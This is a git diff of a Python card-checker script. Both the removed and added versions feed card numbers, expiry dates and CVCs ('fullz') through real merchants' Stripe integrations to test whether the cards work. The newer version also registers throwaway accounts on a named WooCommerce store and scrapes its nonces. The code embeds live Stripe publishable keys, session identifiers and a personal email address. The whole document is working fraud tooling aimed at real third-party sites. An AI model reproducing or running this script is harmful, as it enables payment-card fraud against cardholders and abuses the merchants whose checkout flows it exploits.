@@ -1,76 +1,293 @@
-import requests,re
-def Tele(ccx):
-	import requests
-	ccx=ccx.strip()
-	n = ccx.split("|")[0]
-	mm = ccx.split("|")[1]
-	yy = ccx.split("|")[2]
-	cvc = ccx.split("|")[3]
-	if "20" in yy:#Mo3gza
-		yy = yy.split("20")[1]
-	r = requests.session()
+import asyncio
+import base64
+import random
+from fake_useragent import UserAgent
+import requests
+from FUNC.defs import *
+import re
+from bs4 import BeautifulSoup
+from FUNC.defs import *
+
+# import requests
 
 
-	headers = {
-			'authority': 'api.stripe.com',
-			'accept': 'application/json',
-			'accept-language': 'en-US,en;q=0.9',
-			'content-type': 'application/x-www-form-urlencoded',
-			'origin': 'https://js.stripe.com',
-			'referer': 'https://js.stripe.com/',
-			'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-			'sec-ch-ua-mobile': '?1',
-			'sec-ch-ua-platform': '"Android"',
-			'sec-fetch-dest': 'empty',
-			'sec-fetch-mode': 'cors',
-			'sec-fetch-site': 'same-site',
-			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-	}
-
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51Q9zOoP8CnXsumqaMSligBEuHCOTbbw06EdZ8p0Yvr64Pgi7jDwI8IzHSZZWrsj0atvhQfrCDFuYWslVhgqJWSyH006EBFpwtZ'
-	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-
-	pm = r1.json()['id']
+def gets(s, start, end):
+            try:
+                start_index = s.index(start) + len(start)
+                end_index = s.index(end, start_index)
+                return s[start_index:end_index]
+            except ValueError:
+                return None
 
 
-	cookies = {
-            '__stripe_mid': '3d85359e-8d75-414e-9b44-1b5c4412a86152dadf',
-            '__stripe_sid': 'e9dcd3cd-c9f0-4b99-af1b-0f7bb66a624748b1cb',
-	}
 
-	headers = {
-            'authority': 'g-pg.com.au',
+
+async def create_cvv_charge(fullz , session):
+    try:
+        cc , mes , ano , cvv = fullz.split("|")
+        user_agent          = UserAgent().random
+        random_data         = await get_random_info(session)
+        fname               = random_data["fname"]
+        lname               = random_data["lname"]
+        email               = random_data["email"]
+
+
+
+        headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'dnt': '1',
+            'priority': 'u=0, i',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'sec-gpc': '1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
+        }
+
+        response = await session.get('https://aurellie-store.com/my-account/', headers=headers)
+
+
+        nonce = gets(response.text, '<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" /><')
+
+
+        print(nonce)
+
+
+        headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dnt': '1',
+            'origin': 'https://aurellie-store.com',
+            'priority': 'u=0, i',
+            'referer': 'https://aurellie-store.com/my-account/',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'sec-gpc': '1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
+        }
+
+        data = {
+            'email': email,
+            'password': 'WLY6dWCBHrJTZlkjlk;w',
+            'wc_order_attribution_source_type': 'typein',
+            'wc_order_attribution_referrer': '(none)',
+            'wc_order_attribution_utm_campaign': '(none)',
+            'wc_order_attribution_utm_source': '(direct)',
+            'wc_order_attribution_utm_medium': '(none)',
+            'wc_order_attribution_utm_content': '(none)',
+            'wc_order_attribution_utm_id': '(none)',
+            'wc_order_attribution_utm_term': '(none)',
+            'wc_order_attribution_utm_source_platform': '(none)',
+            'wc_order_attribution_utm_creative_format': '(none)',
+            'wc_order_attribution_utm_marketing_tactic': '(none)',
+            'wc_order_attribution_session_entry': 'https://aurellie-store.com/',
+            'wc_order_attribution_session_start_time': '2025-03-05 12:03:27',
+            'wc_order_attribution_session_pages': '8',
+            'wc_order_attribution_session_count': '1',
+            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
+            'woocommerce-register-nonce': nonce,
+            '_wp_http_referer': '/my-account/',
+            'register': 'Register',
+        }
+
+        response = await session.post('https://aurellie-store.com/my-account/', headers=headers, data=data)
+
+
+
+
+
+
+        headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'dnt': '1',
+            'priority': 'u=0, i',
+            'referer': 'https://aurellie-store.com/my-account/',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'sec-gpc': '1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
+        }
+
+        response = await session.get('https://aurellie-store.com/my-account/', headers=headers)
+
+
+
+
+
+
+        headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'dnt': '1',
+            'priority': 'u=0, i',
+            'referer': 'https://aurellie-store.com/my-account/',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'sec-gpc': '1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
+        }
+
+        response = await session.get('https://aurellie-store.com/my-account/payment-methods/', headers=headers)
+
+
+        headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'dnt': '1',
+            'priority': 'u=0, i',
+            'referer': 'https://aurellie-store.com/my-account/payment-methods/',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'sec-gpc': '1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
+        }
+
+        response = await session.get('https://aurellie-store.com/my-account/add-payment-method/', headers=headers)
+        
+
+
+        payment_nonce = gets(response.text, '"createAndConfirmSetupIntentNonce":"', '"')
+
+        print(payment_nonce)
+
+
+        headers = {
+            'accept': 'application/json',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dnt': '1',
+            'origin': 'https://js.stripe.com',
+            'priority': 'u=1, i',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'sec-gpc': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
+        }
+        data={
+        'type':'card',
+        'card[number]':cc,
+        'card[cvc]':cvv,
+        'card[exp_year]':ano,
+        'card[exp_month]':mes,
+        'allow_redisplay':'unspecified',
+        'billing_details[address][country]':'IN',
+        'pasted_fields':'number',
+        'payment_user_agent':'stripe.js/39de0b7336; stripe-js-v3/39de0b7336; payment-element; deferred-intent',
+        'referrer':'https://aurellie-store.com',
+        'time_on_page':'56435',
+        'client_attribution_metadata[client_session_id]':'6d0f8fbf-209d-4ddf-aef5-d298407f0ca3',
+        'client_attribution_metadata[merchant_integration_source]':'elements',
+        'client_attribution_metadata[merchant_integration_subtype]':'payment-element',
+        'client_attribution_metadata[merchant_integration_version]':'2021',
+        'client_attribution_metadata[payment_intent_creation_flow]':'deferred',
+        'client_attribution_metadata[payment_method_selection_flow]':'merchant_specified',
+        'guid':'fd286b17-3ad6-4186-8cd6-e30c9fb40054b2fc13',
+        'muid':'4b6420f1-7adb-432f-82c8-d022e115538d87c454',
+        'sid':'5821de0d-22e9-46ae-88e2-f01cbf19da7642b049',
+        'key':'pk_live_51EpKFnDIbM3UXlVoRew9BbM8JpxtboelfaqVfjryY3Mn06HsdNqdUXQ1CyV0d8dtybVtBFJ3qEFOuVD1r6P3utTj00ccHUJo3L',
+        '_stripe_version':'2024-06-20',
+        }
+
+        response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+
+
+
+
+        try:
+             id=response.json()['id']
+             print(id)
+        except:
+             return response.text
+
+
+
+
+
+
+
+
+
+
+        headers = {
             'accept': '*/*',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            # 'cookie': '__stripe_mid=3d85359e-8d75-414e-9b44-1b5c4412a86152dadf; __stripe_sid=e9dcd3cd-c9f0-4b99-af1b-0f7bb66a624748b1cb',
-            'origin': 'https://g-pg.com.au',
-            'referer': 'https://g-pg.com.au/welcome/repeat-script-requests',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
+            'dnt': '1',
+            'origin': 'https://aurellie-store.com',
+            'priority': 'u=1, i',
+            'referer': 'https://aurellie-store.com/my-account/add-payment-method/',
+            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'sec-gpc': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
             'x-requested-with': 'XMLHttpRequest',
-	}
+        }
 
-	params = {
-			't': '1729922956202',
-	}
+        params = {
+            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
+        }
 
-	data = {
-            'data': '__fluent_form_embded_post_id=1138&_fluentform_5_fluentformnonce=a397b837fc&_wp_http_referer=%2Fwelcome%2Frepeat-script-requests&names%5Bfirst_name%5D=Chit&names%5Blast_name%5D=Nge&datetime=21%2F10%2F2000&names_1%5Bfirst_name%5D=Chit&names_1%5Blast_name%5D=Nge&input_text=Tgg&address_1%5Baddress_line_1%5D=New%20York&address_1%5Bcity%5D=New%20York%20&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&numeric-field=1502565942&email=saimyataungcr8%40gmail.com&dropdown=Dr%20Jo%20Centra&message=Cc&datetime_2=03%2F10%2F2024&message_1=Cc&datetime_1=31%2F10%2F2024&payment_input=Standard%20Script%20Request&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
-            'action': 'fluentform_submit',
-            'form_id': '5',
-	}
-	
-	r2 = requests.post(
-			'https://g-pg.com.au/wp-admin/admin-ajax.php',
-			params=params,
-			cookies=cookies,
-			headers=headers,
-			data=data,
-	)
-	return (r2.json()['errors'])
+        data = {
+            'action': 'create_and_confirm_setup_intent',
+            'wc-stripe-payment-method': id,
+            'wc-stripe-payment-type': 'card',
+            '_ajax_nonce': payment_nonce,
+        }
+
+        response = await session.post('https://aurellie-store.com/', params=params, headers=headers, data=data)
+
+
+
+        print(response.text)
+
+        return response.text
+
+
+
+
+
+    except Exception as e:
+        return str(e)
